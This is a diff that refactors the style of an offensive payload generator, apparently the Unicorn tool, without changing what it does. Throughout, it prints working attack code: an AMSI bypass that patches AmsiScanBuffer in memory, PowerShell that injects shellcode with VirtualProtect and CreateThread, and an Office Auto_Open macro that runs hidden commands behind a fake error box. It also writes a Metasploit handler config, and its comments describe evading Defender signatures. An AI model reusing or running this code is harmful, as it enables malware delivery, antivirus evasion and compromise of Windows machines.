@@ -79,7 +79,8 @@ def generate_random_string(low, high):
 
 # generate a random number based on range
 def generate_random_number(low, high):
-    for x in range(1): return random.randint(low,high)
+    for _ in range(1):
+        return random.randint(low,high)
 
 # randomize words for evasion
 def mangle_word(word):
@@ -526,8 +527,7 @@ def gen_usage():
 
 # Using Rasta Mouse AMSI Bypass: https://raw.githubusercontent.com/rasta-mouse/AmsiScanBufferBypass/master/ASBBypass.ps1
 def bypass_amsi():
-    amsi_string = ("""$1111 = @"\nusing System;using System.Runtime.InteropServices;public class Win32 {[DllImport("$kernel32")]public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);[DllImport("$kernel32")] public static extern IntPtr LoadLibrary(string name);[DllImport("$kernel32")] public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);}\n"@\nAdd-Type $1111;$2222 = [Win32]::GetProcAddress([Win32]::LoadLibrary("$amsi$dll"), "$amsi$scan$buffer");$3333 = 0;[Win32]::VirtualProtect($2222, [uint32][uint32]5, 0x40, [ref]$3333);$4444 = [Byte[]] (0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3);[System.Runtime.InteropServices.Marshal]::Copy($4444, 0, $2222, 6)""")
-    return amsi_string
+    return """$1111 = @"\nusing System;using System.Runtime.InteropServices;public class Win32 {[DllImport("$kernel32")]public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);[DllImport("$kernel32")] public static extern IntPtr LoadLibrary(string name);[DllImport("$kernel32")] public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);}\n"@\nAdd-Type $1111;$2222 = [Win32]::GetProcAddress([Win32]::LoadLibrary("$amsi$dll"), "$amsi$scan$buffer");$3333 = 0;[Win32]::VirtualProtect($2222, [uint32][uint32]5, 0x40, [ref]$3333);$4444 = [Byte[]] (0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3);[System.Runtime.InteropServices.Marshal]::Copy($4444, 0, $2222, 6)"""
 
 # this will convert any url to hexformat for download/exec payload
 def url_hexified(url):
@@ -544,9 +544,8 @@ def split_str(s, length):
 
 # write a file to designated path
 def write_file(path, text):
-    file_write = open(path, "w")
-    file_write.write(text)
-    file_write.close()
+    with open(path, "w") as file_write:
+        file_write.write(text)
 
 
 # scramble commmands into multiple strings
@@ -576,7 +575,7 @@ def scramble_stuff():
 
     full_shell = list3[:-2]
 
-    return full_exe + "," + ps_only + "," + full_wscript + "," + full_shell
+    return f"{full_exe},{ps_only},{full_wscript},{full_shell}"
 
 # generate full macro
 def generate_macro(full_attack, line_length=50):
@@ -589,10 +588,7 @@ def generate_macro(full_attack, line_length=50):
     macro_rand = generate_random_string(5, 10)
     # start of the macro
     macro_str = ("Sub Auto_Open()\nDim {0}\n{1} = ".format(macro_rand, macro_rand))
-    if line_length is None:
-        line_length_int = 50
-    else:
-        line_length_int = int(line_length)
+    line_length_int = 50 if line_length is None else int(line_length)
     powershell_command_list = split_str(full_attack, line_length_int)
 
     counter = 0
@@ -600,7 +596,7 @@ def generate_macro(full_attack, line_length=50):
         if counter == 0:
             macro_str += " \"" + line + "\"\n"
         if counter >= 1:
-            macro_str += macro_rand + " = " + macro_rand + " + \"" + line + "\"\n"
+            macro_str += f"{macro_rand} = {macro_rand}" + " + \"" + line + "\"\n"
 
         counter = counter + 1
 
@@ -638,7 +634,7 @@ def generate_macro(full_attack, line_length=50):
 
     # title bar on top what it states there, you can also change this to whatever you want
     subject_message = ("Microsoft Office (Compatibility Mode)")
- 
+
     # our final product of obfsucated code - note that defender made a signature to look for WScript.Run with a compacted string with a "False" terminal window. Just needed to split it out into two lines :P
     macro_str += ("""\n\nDim {0}\n{1} = {2}\nDim {3}\n{4} = {5}\nDim {6}\n{7} = {8} & "." & {9}\nDim {10}\nDim {11}\nSet {12} = VBA.CreateObject({13})\nDim waitOnReturn As Boolean: waitOnReturn = False\nDim windowStyle As Integer: windowStyle = 0\nDim {14}\n{14} = {15} & " "\n{17}.Run {18} & {19}, windowStyle, waitOnReturn\n\nDim title As String\ntitle = "{21}"\nDim msg As String\nDim intResponse As Integer\nmsg = "{20}"\nintResponse = MsgBox(msg, 16, title)\nApplication.Quit\nEnd Sub""".format(function1, function1, shell, function2, function2, wscript, function3, function3, function2, function1, function4, function5, function4, function3, function6, ps_long, function5, function4, function6,macro_rand,macro_message,subject_message))
 
@@ -739,7 +735,7 @@ def generate_shellcode(payload, ipaddr, port):
     port = port.replace("LPORT=", "")
 
     # if we are using traditional payloads and not download_exec
-    if not "exe=" in ipaddr:
+    if "exe=" not in ipaddr:
         ipaddr = "LHOST={0}".format(ipaddr)
         port = "LPORT={0}".format(port)
 
@@ -822,7 +818,7 @@ def gen_shellcode_attack(payload, ipaddr, port):
         shellcode = newdata[:-1]
 
         # if we aren't using download/exec
-        if not "url=" in ipaddr:
+        if "url=" not in ipaddr:
             # write out rc file
             write_file("unicorn.rc", "use multi/handler\nset payload {0}\nset LHOST {1}\nset LPORT {2}\nset ExitOnSession false\nset AutoVerifySession false\nset AutoSystemInfo false\nset AutoLoadStdapi false\nexploit -j\n".format(payload, ipaddr, port))
 
@@ -830,49 +826,49 @@ def gen_shellcode_attack(payload, ipaddr, port):
     if ipaddr == "cobaltstrike": shellcode = payload
 
     # added random vars before and after to change strings
-    # this is a hack job but it works in checking to see if there are any variable name conflicts. While random, can happen when using only 2 randomized characters for char lenght. 
+    # this is a hack job but it works in checking to see if there are any variable name conflicts. While random, can happen when using only 2 randomized characters for char lenght.
     while True:
         varcheck = ("")
         reroll = False
-        var1 = "$" + generate_random_string(2, 2) # $1
+        var1 = f"${generate_random_string(2, 2)}"
         varcheck = var1
-        var2 = "$" + generate_random_string(2, 2) # $c
+        var2 = f"${generate_random_string(2, 2)}"
         if var2.lower() in varcheck.lower():
             reroll = True
         varcheck = varcheck + var2
-        var3 = "$" + generate_random_string(2, 2) # $2 - powershell
+        var3 = f"${generate_random_string(2, 2)}"
         if var3.lower() in varcheck.lower():
             reroll = True
         varcheck = varcheck + var3
-        var4 = "$" + generate_random_string(2, 2) # $3
+        var4 = f"${generate_random_string(2, 2)}"
         if var4.lower() in varcheck.lower():
             reroll = True
         varcheck = varcheck + var4
-        var5 = "$" + generate_random_string(2, 2) # $x
+        var5 = f"${generate_random_string(2, 2)}"
         if var5.lower() in varcheck.lower():
             reroll = True
         varcheck = varcheck + var5
-        var6 = "$" + generate_random_string(2, 2) # $t
+        var6 = f"${generate_random_string(2, 2)}"
         if var6.lower() in varcheck.lower():
             reroll = True
         varcheck = varcheck + var6
-        var7 = "$" + generate_random_string(2, 2) # $h
+        var7 = f"${generate_random_string(2, 2)}"
         if var7.lower() in varcheck.lower():
             reroll = True
         varcheck = varcheck + var7
-        var8 = "$" + generate_random_string(2, 2) # $z
+        var8 = f"${generate_random_string(2, 2)}"
         if var8.lower() in varcheck.lower():
             reroll = True
         varcheck = varcheck + var8
-        var9 = "$" + generate_random_string(2, 2) # $g
+        var9 = f"${generate_random_string(2, 2)}"
         if var9.lower() in varcheck.lower():
             reroll = True
         varcheck = varcheck + var9
-        var10 = "$" + generate_random_string(2, 2) # $i
+        var10 = f"${generate_random_string(2, 2)}"
         if var10.lower() in varcheck.lower():
             reroll = True
         varcheck = varcheck + var10
-        var11 = "$" + generate_random_string(2, 2) # $w
+        var11 = f"${generate_random_string(2, 2)}"
         if var11.lower() in varcheck.lower():
             reroll = True
         varcheck = varcheck + var11
@@ -880,7 +876,7 @@ def gen_shellcode_attack(payload, ipaddr, port):
         if var12.lower() in varcheck.lower():
             reroll = True
         varcheck = varcheck + var12
-        var13 = "$" + generate_random_string(2, 2) # $4 - Windows
+        var13 = f"${generate_random_string(2, 2)}"
         if var13.lower() in varcheck.lower():
             reroll = True
         varcheck = varcheck + var13
@@ -889,7 +885,7 @@ def gen_shellcode_attack(payload, ipaddr, port):
             reroll = True
         varcheck = varcheck + var14
         tempvar_withoutdollar = generate_random_string(3, 3) # $tempvar
-        var15 = "$" + tempvar_withoutdollar
+        var15 = f"${tempvar_withoutdollar}"
         if var15.lower() in varcheck.lower():
             reroll = True
         varcheck = varcheck + var15
@@ -900,7 +896,7 @@ def gen_shellcode_attack(payload, ipaddr, port):
         varcheck = varcheck + var16
 
 
-        var17 = "$" + generate_random_string(3,3) # $yyyy
+        var17 = f"${generate_random_string(3, 3)}"
         if var17.lower() in varcheck.lower():
             reroll = True
         varcheck = varcheck + var17
@@ -915,9 +911,10 @@ def gen_shellcode_attack(payload, ipaddr, port):
             reroll = True
         varcheck = varcheck + var19
 
-        if reroll == True: print("[*] Great Scott!! There was a variable conflict. This happens. It's OK Marty. Rerolling variable names until we get a solid set to remove conflicting names.")
-        if reroll == False: break
-
+        if not reroll:
+            break
+        else:
+            print("[*] Great Scott!! There was a variable conflict. This happens. It's OK Marty. Rerolling variable names until we get a solid set to remove conflicting names.")
     # generate random service name from win32 - defender was looking from name win32 + 0x00 length inside of byte array
     randomize_service_name = generate_random_string(2,2)
 
@@ -959,13 +956,32 @@ def gen_shellcode_attack(payload, ipaddr, port):
     powershell_code = (r'''$1111='$tttt=''[DllImport(("%s"))]public static extern IntPtr calloc(uint dwSize, uint amount);[DllImport("%s")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("%s")]public static extern IntPtr VirtualProtect(IntPtr lpStartAddress, uint dwSize, uint flNewProtect, out uint %s);[DllImport("%s")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);'';$zzzz="%s";$wwww=Add-Type -pass -m $tttt -Name "%s" -names $Win32;$wwww=$wwww.replace("$Win32", "%s");[byte[]]$zzzz = $zzzz.replace("SHELLCODE_STUB","$randomized_byte_namex").replace("$randomized_byte_name", "0").Split(",");$gggg=0x$randstack;if ($zzzz.L -gt 0x$randstack){$gggg=$zzzz.L};$xxxx=$wwww::calloc(0x$randstack, 1);[UInt64]$tempvar = 0;for($iiii=0;$iiii -le($zzzz.Length-1);$iiii++){$wwww::memset([IntPtr]($xxxx.ToInt32()+$iiii), $zzzz[$iiii], 1)};$wwww::VirtualProtect($xxxx, 0x$randstack, 0x40, [Ref]$tempvar);$yyyy=[int]0x00;$wwww::CreateThread([int]0,$yyyy,$xxxx,0,0,1-1);';$hhhh=[Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($1111));$2222="powershell";$4444="Windows";$5555 = "C:\$4444\$syswowsplit_1$syswowsplit_2\$4444$2222\v1.0\$2222";$5555 = $5555.replace("$syswowsplit_1", "sys");$5555 = $5555.replace("$syswowsplit_2", "wow64");$$truevalue = '%s';if([environment]::Is64BitOperatingSystem -eq '$$truevalue'){$2222= $5555};$fullcommand=" $2222 $noexit $hhhh";$fullcommand=$fullcommand.replace("$noexit", "-noexit -e");iex $fullcommand''' % (msv,kernel,kernel,tempvar_withoutdollar,msv,shellcode,randomize_service_name,Win32,true_mangle)).replace("SHELLCODE_STUB", mangle_shellcode)
 
     # run it through a lame var replace
-    powershell_code = powershell_code.replace("$1111", var1).replace("$cccc", var2).replace(
-        "$2222", var3).replace("$3333", var4).replace("$xxxx", var5).replace("$tttt", var6).replace(
-        "$hhhh", var7).replace("$zzzz", var8).replace("$gggg", var9).replace("$iiii", var10).replace(
-        "$wwww", var11).replace("$randstack", var12).replace("$4444", var13).replace("$tempvar", var15).replace(
-        "$yyyy", var17).replace("$Win32", var18).replace("$randomized_byte_name", randomized_byte_name).replace(
-        "$fullcommand", "$" + full_command).replace("$5555", "$" + syswow_var).replace("$noexit", noexit).replace(
-        "$truevalue", truevalue).replace("$syswowsplit_1", syswowsplit_1).replace("$syswowsplit_2", syswowsplit_2)
+    powershell_code = (
+        powershell_code.replace("$1111", var1)
+        .replace("$cccc", var2)
+        .replace("$2222", var3)
+        .replace("$3333", var4)
+        .replace("$xxxx", var5)
+        .replace("$tttt", var6)
+        .replace("$hhhh", var7)
+        .replace("$zzzz", var8)
+        .replace("$gggg", var9)
+        .replace("$iiii", var10)
+        .replace("$wwww", var11)
+        .replace("$randstack", var12)
+        .replace("$4444", var13)
+        .replace("$tempvar", var15)
+        .replace("$yyyy", var17)
+        .replace("$Win32", var18)
+        .replace("$randomized_byte_name", randomized_byte_name)
+        .replace("$fullcommand", f"${full_command}")
+        .replace("$5555", f"${syswow_var}")
+        .replace("$noexit", noexit)
+        .replace("$truevalue", truevalue)
+        .replace("$syswowsplit_1", syswowsplit_1)
+        .replace("$syswowsplit_2", syswowsplit_2)
+    )
+
 
     # if we have PRINT_DECODED="ON" this will spit out the raw powershell code for you
     if PRINT_DECODED.lower() == "on":
@@ -982,8 +998,7 @@ def gen_shellcode_attack(payload, ipaddr, port):
 def gen_ps1_attack(ps1path):
     if os.path.isfile(ps1path):
         with open(ps1path, 'r') as scriptfile:
-            data = scriptfile.read()
-            return data
+            return scriptfile.read()
     else:
         print("[!] {0} does not exist. Please check your path".format(ps1path))
         sys.exit(1)
